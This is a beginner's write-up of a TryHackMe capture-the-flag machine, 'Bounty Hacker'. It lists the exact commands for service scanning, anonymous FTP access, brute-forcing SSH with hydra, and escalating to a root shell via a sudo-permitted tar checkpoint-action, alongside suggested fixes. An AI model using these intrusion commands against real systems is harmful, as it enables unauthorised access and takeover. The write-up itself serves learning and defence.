## üìã Executive Summary  

This report details my penetration test of the **Bounty Hacker** machine on TryHackMe (IP: `<ip_address>`). I identified security weaknesses, gained user access, and escalated to root to capture two flags (secret codes).  

The main issues were:  
- Open FTP server allowing anonymous access.  
- Exposed files with a username and password list.  
- Weak SSH credentials.  
- Misconfigured command allowing full system control.  

This beginner-friendly report explains the process simply, highlights vulnerabilities, and suggests fixes to secure the system.

## üéØ Scope  

I tested the Bounty Hacker machine to find security flaws, gain access, and capture the **user** and **root** flags. This simulated a real-world hack to learn how to find and fix vulnerabilities.

## üö® Key Vulnerabilities  

| Vulnerability              | Impact                                    | Fix                                          |
|----------------------------|-------------------------------------------|----------------------------------------------|
| Anonymous FTP Access       | Exposed sensitive files to anyone         | Disable anonymous FTP or restrict access     |
| Exposed Password Files     | Revealed username and passwords for attacks | Secure files with permissions or encryption |
| Weak SSH Credentials       | Allowed unauthorized login as user `lin`  | Use strong passwords and enable MFA          |
| Misconfigured Sudo (`tar`) | Enabled full system control (root access) | Restrict sudo to safe, specific commands     |

## üõ†Ô∏è Exploitation Steps  

### 1. Scanning the System (Reconnaissance)  
**Time:** 08:30  
- **Command:**  
  ```bash
  nmap -sV <ip_address>
  ```

* **Findings:**  
  * Port 21: FTP (vsftpd 3.0.3) ‚Äì file sharing  
  * Port 22: SSH (OpenSSH 7.2p2) ‚Äì remote login  
  * Port 80: Apache 2.4.18 ‚Äì web server  
  * Port 990: Closed (FTPS)  
* **Why It Matters:** Identified entry points (FTP, SSH) to focus my attack.  

---

### 2. Exploring FTP (File Access)  
**Time:** 08:35  
* **Command:**  
  ```bash
  ftp <ip_address>
  ```  
* **Actions:** Listed files with `ls -la`. Found:  
  * `task.txt`: Contained username `lin`  
  * `locks.txt`: List of passwords  
* **How I Read Them:** Used `less task.txt` and `less locks.txt` after `cat` failed.  
* **Why It Matters:** These files gave me a username and passwords to try for SSH.  

---

### 3. Breaking into SSH (User Access)  
**Time:** 08:45  
* **Command:**  
  ```bash
  hydra -l lin -P <file_path_to_locks> <ip_address> ssh
  ```  
* **Findings:** Found the correct password for `lin`.  
* **Next Steps:** Logged in via SSH and found `user.txt` with the user flag.  
  ```bash
  ssh lin@<ip_address>
  cat user.txt
  ```  
* **Why It Matters:** Gained user access and captured the first flag.  

---

### 4. Becoming Root (Privilege Escalation)  
**Time:** 09:00  
* **Command:**  
  ```bash
  sudo -l
  ```  
* **Findings:** `lin` could run `tar` as root.  

**Time:** 09:05  
* **Command:**  
  ```bash
  sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
  ```  
* **Result:** Got a root shell (full system control).  

**Time:** 09:10  
* **Command:**  
  ```bash
  cat /root/root.txt
  ```  
* **Why It Matters:** Captured the root flag and took over the system.  

---

## üß† Lessons Learned  

* **Lock FTP:** Prevent anonymous access and limit file visibility.  
* **Hide Secrets:** Don‚Äôt leave usernames or passwords in open files.  
* **Secure SSH:** Use strong passwords and add multi-factor authentication (MFA).  
* **Fix Sudo:** Limit what commands users can run as root.  
* **Scan Regularly:** Use `nmap` to find and fix open services before attackers do.  

---

## üíª Skills Demonstrated  

* Service Enumeration ‚Äì `nmap`, `ftp`  
* Password Brute-Forcing ‚Äì `hydra`  
* SSH Exploitation ‚Äì gained user access with cracked credentials  
* Privilege Escalation ‚Äì misconfigured `tar` command  

---

## üõ†Ô∏è Tools and Files Used  

**Tools:**  
* `nmap` ‚Äì Scanned for open services  
* `ftp` ‚Äì Accessed file server  
* `hydra` ‚Äì Brute-forced SSH passwords  
* `ssh` ‚Äì Logged into the system  
* `sudo` ‚Äì Checked and exploited permissions  
* `tar` ‚Äì Used for privilege escalation  

**Files:**  
* `task.txt`, `locks.txt`, `user.txt`, `root.txt`, `<file_path_to_locks>`  

**Environment:**  
* TryHackMe (Ubuntu Linux), Kali Linux

## üåü Final Thoughts  

By exploiting these vulnerabilities, I showed how an attacker could take full control of a system, from accessing files to gaining root privileges. These issues‚Äîopen FTP, exposed passwords, weak logins, and risky sudo settings‚Äîare common in real-world systems. Fixing them is critical to protect servers from hackers. This exercise improved my skills in finding and securing vulnerabilities, preparing me to protect real-world systems better.
